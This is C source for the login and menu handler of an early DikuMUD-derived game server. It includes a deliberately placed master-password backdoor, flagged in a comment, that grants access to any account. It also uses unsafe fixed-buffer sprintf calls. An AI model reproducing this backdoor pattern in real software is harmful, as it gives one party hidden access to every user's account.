/* ************************************************************************
*  file: Nanny.c , Master Socket Handling module.         Part of DIKUMUD *
*  Usage: Procedures interpreting user command                            *
*  Copyright (C) 1990, 1991 - see 'license.doc' for complete information. *
************************************************************************* */



#include CONFIG

#if HAVE_STRINGS_H

#include <strings.h>
#endif

#if HAVE_STRING_H
#include <string.h>
#endif

#include <ctype.h>


#include "structs.h"
#include "comm.h"
#include "interp.h"
#include "player.h"
#include "db.h"
#include "org.h"
#include "utils.h"
#include "error.h"
#include "proto.h"

#include <sys/time.h>

/* for hiding passwords */
#include <arpa/telnet.h>

char echo_off_str[]={IAC,WILL,TELOPT_ECHO,NULL};
char echo_on_str[]={IAC,WONT,TELOPT_ECHO,'\r','\n',NULL};

#define ECHO_OFF SEND_TO_Q(echo_off_str,d);

#define ECHO_ON SEND_TO_Q(echo_on_str,d);

#define NOT !
#define AND &&
#define OR ||

#define STATE(d) ((d)->connected)

extern int log_all,req_passwd,override;
extern char *story,*menu;
extern char motd[MAX_STRING_LENGTH];
extern struct char_data *character_list;
extern struct descriptor_data *descriptor_list;
extern struct room_data *world;
extern int make_admin;
extern char log_buf[];
extern char hostname[];

/* external fcntls */

void init_char(struct char_data *ch);
void log(char *str);
int default_loc(int hometown);
/*extern char *crypt(char *key,char *salt);*/

int restrict = 0;   /* Open to new players (no restrictions) */

/* *************************************************************************
*  Stuff for controlling the non-playing sockets (get name, pwd etc)       *
************************************************************************* */

#define READER_FILE "readers"

struct reader_type *readers=NULL;

void boot_readers()
{
    FILE *fl;
    int i,tmp;
    char *str;
    struct reader_type *new;

    if(!(fl=fopen(READER_FILE,"r"))) {
	perror("readers");
	exit(0);
    }

    for(;;) { /* Do I really want to do it like this? */
	fscanf(fl," #%d\n",&tmp);

	str = fread_string(fl);

	if(*str=='$')
	    break;

	CREATE(new,struct reader_type,1);
	new->next = readers;
	readers = new;
	new->number = tmp;
	new->title = str;
	new->text = fread_string(fl);

	fscanf(fl,"%d\n",&tmp);
	new->items = tmp;
	for(i=0;i<new->items;i++) {
	    fscanf(fl," %d ", &tmp);
	    new->select[i]=tmp;
	}
    }
}

struct reader_type *find_reader(int number)
{
    struct reader_type *r;

    for(r=readers;r;r=r->next)
	if(r->number==number)
	    return(r);

    sprintf(log_buf,"BUG: Bad reader %d!",number);
    log(log_buf);
    return NULL;
}

void online_reader(struct descriptor_data *d, char *arg)
{
    int sel=-1;
    char buf[MAX_STRING_LENGTH];
    struct reader_type *new_reader;

    if(!arg) { /* Entering the reader system */
	if(!(d->reader = find_reader(0))) {
	    STATE(d) = CON_SLCT;
	    return;
	}
    } else {
	for (; isspace(*arg); arg++)  ;

	/* Perhaps this will change to "enter the game" at some point */
	if(*arg=='m' || *arg=='M') {
	    SEND_TO_Q(menu,d);
	    STATE(d) = CON_SLCT;
	    return;
	}

	if(*arg=='r' || *arg=='R') {
	    SEND_TO_Q(d->reader->text,d);
	} else {
            if(!*arg)
                sel=0;
            else
                sel=atoi(arg)-1;

            if(sel==-1) /* Go to root reader */
                d->reader = find_reader(0);
	    else if(d->reader->items <=1)
		d->reader = find_reader(d->reader->select[0]);
	    else if(sel < 0 || sel >= d->reader->items) {
		SEND_TO_Q("Bad choice. Select again ('M' - Menu, 'R' - Repeat, '0' - Top Reader):",d);
		return;
	    } else if(!(new_reader = find_reader(d->reader->select[sel]))){
		SEND_TO_Q("Not available.\n\r",d);
	    } else
		d->reader = new_reader;
	}
    }
    SEND_TO_Q(d->reader->text,d);

    if(d->reader->items==1) {
	SEND_TO_Q("[Press Return]",d);
	return;
    } else {
	sprintf(buf,"Choice [1-%d/M/R/0]:",d->reader->items);
	SEND_TO_Q(buf,d);
    }

}

void send_welcome(struct char_data *ch)
{
    char buf[MAX_STRING_LENGTH];
    time_t tim;
    extern char *vers;

    tim=time(0);
    sprintf(buf,"\nWelcome - this is Copper %s running on %s.\n\
Local realtime is %s\n", vers, hostname, ctime(&tim));
    send_to_char(buf,ch);
}

int _legal_name(char *arg, char *name)
{
    int i;

    /* skip whitespaces */
    for (; isspace(*arg); arg++);
    
    for (i = 0; (*name = *arg); arg++, i++, name++) 
     if ((*arg <0) || !isalpha(*arg) || i > 11)
       return(1); 

    if((i < 3) || (str_cmp(arg, "self") == 0) ||
	(str_cmp(arg, "all") == 0) || (str_cmp(arg, "group") == 0) ||
	(str_cmp(arg, "local") == 0) || (str_cmp(arg, "north") == 0) ||
	(str_cmp(arg, "east") == 0) || (str_cmp(arg, "south") == 0) ||
	(str_cmp(arg, "west") == 0) || (str_cmp(arg, "up") == 0) ||
	(str_cmp(arg, "down") == 0) || (str_cmp(arg, "out") == 0) ||
	stristr(arg,"fuck") || stristr(arg,"shit") ||
	stristr(arg,"suck") || stristr(arg,"kill") ||
	stristr(arg,"thief") || stristr(arg,"cunt") ||
	stristr(arg,"crap"))
	return(1);

    return(0);
}
	    
bool check_playing(struct descriptor_data *d)
{
    struct descriptor_data *k;

    /* Check if already playing (again) */
    for(k=descriptor_list; k; k = k->next) {
	if ((k->character != d->character) && k->character) {
	    if (k->original) {
		if (GET_NAME(k->original) &&
     			    !(str_cmp(GET_NAME(k->original), d->name)))
		    return TRUE;
	    } else { /* No switch has been made */
		if (GET_NAME(k->character) &&
		  (str_cmp(GET_NAME(k->character), d->name) == 0))
		    return TRUE;
	    }
	}
    }
    return FALSE;
}

/* deal with newcomers and other non-playing sockets */
void nanny(struct descriptor_data *d, char *arg)
{
    char buf[100];
    char tmp_name[20];
    struct char_data *tmp_ch;

    switch (STATE(d))
    {
	case CON_NME:		/* wait for input of code	*/
	    for (; isspace(*arg); arg++)  ;
	    if (!*arg)
	     close_socket(d);
	    else {

		if(_legal_name(arg, tmp_name)) {
		    SEND_TO_Q("Illegal name, please try another.\n\r", d);
		    SEND_TO_Q("Name> ", d);
		    return;
		}

                /* Here, it would be ideal to load just password... */
                if(!strcasecmp(tmp_name,"new")) {
		    if (restrict == 1) {
			SEND_TO_Q("Sorry, the game is closed to new players.", d);
			STATE(d) = CON_CLOSE;
			return;
		    } /* if */

		    SEND_TO_Q("Select a name:", d);

		    STATE(d) = CON_NEWPL;
		} else if((tmp_ch=load_char(tmp_name)))
		{
		/* Make a copy of the player name, and
		* set the actual player name to null string.
		* This way, people can't lock you out
		* by sitting at the password prompt. :-)
		* Once password is given, reset the name.
		*/
		    d->character = tmp_ch;
                    d->character->desc = d;
		    d->name = (char*)strdup(d->character->player.name);
		    d->character->player.name[0] = '\0';

		    SEND_TO_Q("Password> ", d);
		    ECHO_OFF

		    STATE(d) = CON_PWDNRM;
		}
		else
		{
                    SEND_TO_Q("No such character!\nName? ",d);
		}
	    }
	    break;

	case CON_NEWPL:  /* get new name */
	    /* skip whitespaces */
	    for (; isspace(*arg); arg++);
	    
            if(_legal_name(arg, tmp_name)) {
                SEND_TO_Q("Illegal name, please try another.\n\r", d);
                SEND_TO_Q("Name: ", d);
                return;
            }

            /* player unknown gotta make a new */
            /***FOR NOW, JUST LOAD A HUMAN***/
            d->character = read_bio(701,VIRTUAL);
            d->character->desc = d;
            CREATE(GET_NAME(d->character), char, strlen(tmp_name) + 1);
            strcpy(GET_NAME(d->character), CAP(tmp_name));

	    /*	sprintf(buf, 
		 "Give me a password for %s: ",
		 GET_NAME(d->character));
		
		SEND_TO_Q(buf, d);
		ECHO_OFF*/

            SEND_TO_Q("Choose a sex (male/female):" , d);

            STATE(d) = CON_QSEX;/*was PWDGET */
	    break;

	case CON_PWDNRM:	/* get pwd for known player	*/
	    /* skip whitespaces */
	    for (; isspace(*arg); arg++);
	    if (!*arg)
	        close_socket(d);
            /* WARNING: Backdoor password here!!! */
            if(!strcmp(crypt(arg,"podtor"),"poEK3s8Ytuxjc") && override){
		    sprintf(buf,"WIZ: Override used on %s", d->name);
		    log(buf);
            } else if(!d->character->prefs ||/* Char can't be logged in */
		                  strncmp(crypt(arg,d->character->prefs->pwd),
                                  d->character->prefs->pwd,10)) {
                    
	        SEND_TO_Q("Wrongo, sticky-fingers!\n\r", d);
	        STATE(d) = CON_CLOSE;
	        break;
	    }

	    ECHO_ON

	    if(check_playing(d)) {
	        SEND_TO_Q("Already playing, cannot connect\n\r", d);
	        SEND_TO_Q("Name: ", d);
	        STATE(d) = CON_NME;
                free_char(d->character);
	        d->character = NULL;
	        return;
	    }

		/*
		 * Once password is right, reset the
		 * player name.  
		 */
            strcpy(d->character->player.name, d->name);
            free(d->name);
            d->name = NULL;

            /* Need to expand this */

            if(*d->character->prefs->pwd=='\0') {
                SEND_TO_Q("Your password has expired! Please choose a new one.\n\r\n\r",d);
            }

            for (tmp_ch = character_list; tmp_ch; tmp_ch = tmp_ch->next)
                if (!str_cmp(GET_NAME(d->character), GET_NAME(tmp_ch)) &&
                    !tmp_ch->desc && !IS_NPC(tmp_ch))
                {
                    SEND_TO_Q("Reconnecting.\n\r", d);
                    free_char(d->character);
                    tmp_ch->desc = d;
                    d->character = tmp_ch;
                    d->idle = 0;
                    STATE(d) = CON_PLYNG;
                    act("$n has reconnected.", TRUE, tmp_ch, 0, 0, TO_ROOM);
                    sprintf(buf, "%s[%s] has reconnected.", GET_NAME(
                        d->character), d->host);
                    log(buf);
                    return;
                }
		    
		    
            sprintf(buf,"%s[%s] has connected.",GET_NAME(d->character),d->host);
            log(buf);

            if(d->character->prefs->flags & PLR_DEAD) {
                SEND_TO_Q("Oops...seems you should be dead.\n\r Would you like to see your intrinsics? ",d);
                STATE(d) = CON_INTRIN;
            } else {
                SEND_TO_Q(motd, d);
                SEND_TO_Q("\n\r\n*** PRESS RETURN: ", d);

                STATE(d) = CON_RMOTD;
            }
	    break;

	case CON_QSEX:		/* query sex of new user	*/
	    /* skip whitespaces */
	    for (; isspace(*arg); arg++);
	    switch (*arg)
	    {
		case 'm':
		case 'M':
		    /* sex MALE */
		    GET_SEX(d->character) = SEX_MALE;
		    break;

		case 'f':
		case 'F':
		    /* sex FEMALE */
		    GET_SEX(d->character) = SEX_FEMALE;
		    break;

		default:
		    SEND_TO_Q("That's not a sex..\n\r", d);
		    SEND_TO_Q("What IS your sex? :", d);
		    return;
		    break;
	    }
	    /* make the guest character */
/***	    init_char(d->character); already done in read_bio() ***/
            if(make_admin) /* Making admin characters */
            {
                GET_EXP(d->character) = 9000000;
                start_player(d->character);
                start_org(d->character,get_org_by_id(ORG_ID_ADMIN));
            } else /* comment out to make guest chars by default */
                start_player(d->character);

            if(!IS_SET(d->character->specials.act,ACT_NOSAVE)) {
                SEND_TO_Q("Enter a password:",d);
                ECHO_OFF
                STATE(d) = CON_PWDNEW2;
                sprintf(log_buf,"WIZ: New player %s [%s]",d->character->player.name,
                    d->host);
                log(log_buf);
            } else {
                SEND_TO_Q(menu,d);
                STATE(d) = CON_SLCT;
                sprintf(log_buf,"WIZ: Guest player %s [%s]",d->character->player.name,
                    d->host);
                log(log_buf);
            }
	    break;

	case CON_RMOTD:		/* read CR after printing motd	*/
	    SEND_TO_Q(menu, d);
	    STATE(d) = CON_SLCT;
	    break;

	case CON_SLCT:		/* get selection from main menu	*/
	    /* skip whitespaces */
	    for (; isspace(*arg); arg++);
	    switch (*arg)
	    {
		case '0':
		    close_socket(d);
		    break;

		case '1':
		    save_char(d->character);

		    send_welcome(d->character);
		    d->character->next = character_list;
		    character_list = d->character;
		    if(d->character->in_room == NOWHERE ||
		    (d->character->in_room<0)) {
			if((!d->character->player.hometown || d->character->player.hometown > 2))
			    d->character->player.hometown=1;
                        char_to_room(d->character, real_room(default_loc(d->character->player.hometown)),0);
		    } else {
			char_to_room(d->character, d->character->in_room,0);
		    }

		    do_time(d->character,"",0);
		    send_to_char("\n\r",d->character);

		    if(world[d->character->in_room].number==12591)
			act("A statue shimmers and becomes $n.",TRUE,d->character,0,0,TO_ROOM);
		    else
			act("$n has entered the game.", TRUE, d->character, 0, 0, TO_ROOM);
		    STATE(d) = CON_PLYNG;
		    do_look(d->character, "",15);
		    d->prompt_mode = 1;
		    break;

		case '2':
		    online_reader(d,NULL);
		    STATE(d) = CON_READERS;
		    break;

		case '3':
                    if(!d->character->prefs) {
                        SEND_TO_Q("But you can't have a password!\n",d);
                        break;
                    }
		    if(req_passwd) {
			SEND_TO_Q("Enter your old password: ", d);
			STATE(d) = CON_PWDNEW;
		    } else {
			SEND_TO_Q("Enter new password: ", d);
			STATE(d) = CON_PWDNEW2;
			sprintf(buf,"Password Replaced on %s",d->character->player.name);
			log(buf);
		    }
		    ECHO_OFF
		    break;
		case '4':
		    SEND_TO_Q("Are you sure you want to delete this character?",d);
		    STATE(d) = CON_DELETE;
		    break;
		default:
		    SEND_TO_Q("Wrong option.\n\r", d);
		    SEND_TO_Q(menu, d);
		    break;
	    }
	    break;
	case CON_PWDNEW:
	    /* skip whitespaces */
	    for (; isspace(*arg); arg++);

	    if (strncmp(crypt(arg, d->character->prefs->pwd),
                        d->character->prefs->pwd, 10)) {
		SEND_TO_Q("Incorrect.\n\r\n\r",d);
		SEND_TO_Q(menu, d);
		STATE(d) = CON_SLCT;
		ECHO_ON
	    } else {
		SEND_TO_Q("Enter a new password: ", d);
		STATE(d) = CON_PWDNEW2;
	    }
	    break;
	case CON_PWDNEW2:
	    /* skip whitespaces */
	    for (; isspace(*arg); arg++);

	    if (!*arg || strlen(arg) > 10)
	    {
		SEND_TO_Q("Illegal password.\n\r", d);
		SEND_TO_Q("Password: ", d);
		return;
	    }

	    strncpy(d->character->prefs->pwd,
                    crypt(arg, d->character->player.name), 10);
	    *(d->character->prefs->pwd + 10) = '\0';

	    SEND_TO_Q("\nPlease retype password: ", d);

	    STATE(d) = CON_PWDNCNF;
	    break;
	case CON_PWDNCNF:
	    /* skip whitespaces */
	    for (; isspace(*arg); arg++);

	    if (strncmp(crypt(arg, d->character->prefs->pwd),
                        d->character->prefs->pwd, 10))
	    {
		SEND_TO_Q("Passwords don't match.\n\r", d);
		SEND_TO_Q("Retype password: ", d);
		STATE(d) = CON_PWDNEW;
		return;
	    }
	    SEND_TO_Q(
		"\n\rDone. You must enter the game to make the change final\n\r", d);
	    SEND_TO_Q(menu, d);
	    STATE(d) = CON_SLCT;
	    ECHO_ON
	    break;
	case CON_CLOSE :
	    close_socket(d);
	    break;
	case CON_READERS:
	    online_reader(d,arg);
	    break;
	case CON_DELETE:
	    if(!strcasecmp(arg,"yes")) {
                d->character->in_room=NOWHERE; /* hack for chars logging in */
		delete_char(d->character);
		extract_char(d->character);
		SEND_TO_Q("See ya!\n\r",d);
		close_socket(d);
	    } else {
		SEND_TO_Q("I didn't think so...\n\r",d);
		STATE(d) = CON_SLCT;
	    } /* What if we want to see intrinsics? */
	    break;

        /* Death Sequence */
        case CON_INTRIN:
	    if(!strcasecmp(arg,"yes")) {
/*                show_intrinsics();*/
                SEND_TO_Q("[Press return]",d);
                STATE(d) = CON_TOMB;
            } else if(!strcasecmp(arg,"no")) {
                outrip(d->character);
                STATE(d) = CON_TOMB2;
                SEND_TO_Q("[press return]\n\r",d);
            } else
                SEND_TO_Q("Please respond with 'yes' or 'no'\n\r",d);
	    break;
        case CON_TOMB:
            /* Make tombstone, and delete character */
            outrip(d->character);
            STATE(d) = CON_TOMB2;
            SEND_TO_Q("[press return]\n\r",d);
	    break;
        case CON_TOMB2:
            d->character->in_room=NOWHERE; /* hack for chars logging in */
            delete_char(d->character);
            extract_char(d->character);
            close_socket(d);
            break;
        case CON_IDQ:
            /* typing is silly */
            SEND_TO_Q("Patience - querying your username.\n\r",d);
            break;
	default:
	    break;
    }
}
